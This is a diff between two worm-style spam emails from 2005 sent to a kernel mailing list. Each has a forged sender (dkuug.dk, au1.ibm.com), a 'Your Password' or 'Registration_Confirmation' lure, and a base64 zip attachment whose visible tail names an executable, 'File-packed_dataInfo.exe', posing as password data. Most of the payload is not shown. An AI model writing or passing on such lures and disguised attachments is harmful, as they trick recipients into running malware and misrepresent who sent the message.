@@ -1,26 +1,26 @@
-From: Admin@dkuug.dk
-Subject: Registration_Confirmation
-Date: Wed, 07 Dec 2005 03:26:53 UTC
-Message-ID: <a10afaaab7954f58a6@oss.sgi.com>
+From: office@au1.ibm.com
+Subject: Your Password
+Date: Wed, 07 Dec 2005 05:42:05 UTC
+Message-ID: <fec404bc38e6a5eb5d@au1.ibm.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=====ef689eabcc958a21fb0d3423"
+Content-Type: multipart/mixed; boundary="b2e741bdbb.75bc26cd6a7"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: max_mk@oss.sgi.com
+To: majordomo@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=====ef689eabcc958a21fb0d3423
+--b2e741bdbb.75bc26cd6a7
 
-Account and Password Information are attached!
+Protected message is attached!
 
 
-***** Go to: http://www.dkuug.dk
-***** Email: postman@dkuug.dk
---=====ef689eabcc958a21fb0d3423
+***** Go to: http://www.au1.ibm.com
+***** Email: postman@au1.ibm.com
+--b2e741bdbb.75bc26cd6a7
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=====ef689eabcc958a21fb0d3423--
+--b2e741bdbb.75bc26cd6a7--
